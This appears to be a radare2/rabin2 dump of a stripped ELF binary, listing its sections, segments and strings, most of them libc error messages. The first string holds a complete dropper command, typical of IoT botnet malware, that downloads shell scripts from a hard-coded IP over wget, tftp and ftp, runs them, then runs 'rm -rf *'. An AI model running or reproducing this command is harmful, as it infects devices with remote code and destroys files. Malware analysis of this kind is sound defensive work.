Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000     0x0 0x00000000     0x0 ---- 
1   0x000000e8    0x13 0x004000e8    0x13 -r-x .init
2   0x00000100  0xc6f8 0x00400100  0xc6f8 -r-x .text
3   0x0000c7f8     0xe 0x0040c7f8     0xe -r-x .fini
4   0x0000c820  0x24d0 0x0040c820  0x24d0 -r-- .rodata
5   0x0000ecf0     0x4 0x0040ecf0     0x4 -r-- .eh_frame
6   0x0000f000    0x10 0x0050f000    0x10 -rw- .ctors
7   0x0000f010    0x10 0x0050f010    0x10 -rw- .dtors
8   0x0000f020     0x8 0x0050f020     0x8 -rw- .jcr
9   0x0000f040   0x510 0x0050f040   0x510 -rw- .data
10  0x0000f550     0x0 0x0050f560  0x68e8 -rw- .bss
11  0x0000f550   0x8b8 0x00000000   0x8b8 ---- .comment
12  0x0000fe08    0x56 0x00000000    0x56 ---- .shstrtab

[Segments]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000  0xecf4 0x00400000  0xecf4 -r-x LOAD0
1   0x0000f000   0x550 0x0050f000  0x6e48 -rw- LOAD1
2   0x00000000     0x0 0x00000000     0x0 -rw- GNU_STACK
3   0x00000000    0x40 0x00400000    0x40 -rw- ehdr

[Entrypoints]
vaddr=0x00400194 paddr=0x00000194 haddr=0x00000018 hvaddr=0x00400018 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr bind type lib name
――――――――――――――――――――――――――――

[Symbols]

nth paddr vaddr bind type size lib name
―――――――――――――――――――――――――――――――――――――――
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x0000c820 0x0040c820 409 410  .rodata ascii   cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.189.233.129/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 206.189.233.129 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 206.189.233.129; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 206.189.233.129 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n
96  0x0000de2d 0x0040de2d 32  33   .rodata ascii   Numerical argument out of domain
97  0x0000de4e 0x0040de4e 29  30   .rodata ascii   Numerical result out of range
98  0x0000de6c 0x0040de6c 25  26   .rodata ascii   Resource deadlock avoided
99  0x0000de86 0x0040de86 18  19   .rodata ascii   File name too long
100 0x0000de99 0x0040de99 18  19   .rodata ascii   No locks available
101 0x0000deac 0x0040deac 24  25   .rodata ascii   Function not implemented
102 0x0000dec5 0x0040dec5 19  20   .rodata ascii   Directory not empty
103 0x0000ded9 0x0040ded9 33  34   .rodata ascii   Too many levels of symbolic links
104 0x0000defc 0x0040defc 26  27   .rodata ascii   No message of desired type
105 0x0000df17 0x0040df17 18  19   .rodata ascii   Identifier removed
106 0x0000df2a 0x0040df2a 27  28   .rodata ascii   Channel number out of range
107 0x0000df46 0x0040df46 24  25   .rodata ascii   Level 2 not synchronized
108 0x0000df5f 0x0040df5f 14  15   .rodata ascii   Level 3 halted
109 0x0000df6e 0x0040df6e 13  14   .rodata ascii   Level 3 reset
110 0x0000df7c 0x0040df7c 24  25   .rodata ascii   Link number out of range
111 0x0000df95 0x0040df95 28  29   .rodata ascii   Protocol driver not attached
112 0x0000dfb2 0x0040dfb2 26  27   .rodata ascii   No CSI structure available
113 0x0000dfcd 0x0040dfcd 14  15   .rodata ascii   Level 2 halted
114 0x0000dfdc 0x0040dfdc 16  17   .rodata ascii   Invalid exchange
115 0x0000dfed 0x0040dfed 26  27   .rodata ascii   Invalid request descriptor
116 0x0000e008 0x0040e008 13  14   .rodata ascii   Exchange full
117 0x0000e016 0x0040e016 8   9    .rodata ascii   No anode
118 0x0000e01f 0x0040e01f 20  21   .rodata ascii   Invalid request code
119 0x0000e034 0x0040e034 12  13   .rodata ascii   Invalid slot
120 0x0000e042 0x0040e042 20  21   .rodata ascii   Bad font file format
121 0x0000e057 0x0040e057 19  20   .rodata ascii   Device not a stream
122 0x0000e06b 0x0040e06b 17  18   .rodata ascii   No data available
123 0x0000e07d 0x0040e07d 13  14   .rodata ascii   Timer expired
124 0x0000e08b 0x0040e08b 24  25   .rodata ascii   Out of streams resources
125 0x0000e0a4 0x0040e0a4 29  30   .rodata ascii   Machine is not on the network
126 0x0000e0c2 0x0040e0c2 21  22   .rodata ascii   Package not installed
127 0x0000e0d8 0x0040e0d8 16  17   .rodata ascii   Object is remote
128 0x0000e0e9 0x0040e0e9 21  22   .rodata ascii   Link has been severed
129 0x0000e0ff 0x0040e0ff 15  16   .rodata ascii   Advertise error
130 0x0000e10f 0x0040e10f 13  14   .rodata ascii   Srmount error
131 0x0000e11d 0x0040e11d 27  28   .rodata ascii   Communication error on send
132 0x0000e139 0x0040e139 14  15   .rodata ascii   Protocol error
133 0x0000e148 0x0040e148 18  19   .rodata ascii   Multihop attempted
134 0x0000e15b 0x0040e15b 18  19   .rodata ascii   RFS specific error
135 0x0000e16e 0x0040e16e 11  12   .rodata ascii   Bad message
136 0x0000e17a 0x0040e17a 37  38   .rodata ascii   Value too large for defined data type
137 0x0000e1a0 0x0040e1a0 26  27   .rodata ascii   Name not unique on network
138 0x0000e1bb 0x0040e1bb 28  29   .rodata ascii   File descriptor in bad state
139 0x0000e1d8 0x0040e1d8 22  23   .rodata ascii   Remote address changed
140 0x0000e1ef 0x0040e1ef 38  39   .rodata ascii   Can not access a needed shared library
141 0x0000e216 0x0040e216 36  37   .rodata ascii   Accessing a corrupted shared library
142 0x0000e23b 0x0040e23b 31  32   .rodata ascii   .lib section in a.out corrupted
143 0x0000e25b 0x0040e25b 47  48   .rodata ascii   Attempting to link in too many shared libraries
144 0x0000e28b 0x0040e28b 37  38   .rodata ascii   Cannot exec a shared library directly
145 0x0000e2b1 0x0040e2b1 49  50   .rodata ascii   Invalid or incomplete multibyte or wide character
146 0x0000e2e3 0x0040e2e3 43  44   .rodata ascii   Interrupted system call should be restarted
147 0x0000e30f 0x0040e30f 18  19   .rodata ascii   Streams pipe error
148 0x0000e322 0x0040e322 14  15   .rodata ascii   Too many users
149 0x0000e331 0x0040e331 30  31   .rodata ascii   Socket operation on non-socket
150 0x0000e350 0x0040e350 28  29   .rodata ascii   Destination address required
151 0x0000e36d 0x0040e36d 16  17   .rodata ascii   Message too long
152 0x0000e37e 0x0040e37e 30  31   .rodata ascii   Protocol wrong type for socket
153 0x0000e39d 0x0040e39d 22  23   .rodata ascii   Protocol not available
154 0x0000e3b4 0x0040e3b4 22  23   .rodata ascii   Protocol not supported
155 0x0000e3cb 0x0040e3cb 25  26   .rodata ascii   Socket type not supported
156 0x0000e3e5 0x0040e3e5 23  24   .rodata ascii   Operation not supported
157 0x0000e3fd 0x0040e3fd 29  30   .rodata ascii   Protocol family not supported
158 0x0000e41b 0x0040e41b 40  41   .rodata ascii   Address family not supported by protocol
159 0x0000e444 0x0040e444 22  23   .rodata ascii   Address already in use
160 0x0000e45b 0x0040e45b 31  32   .rodata ascii   Cannot assign requested address
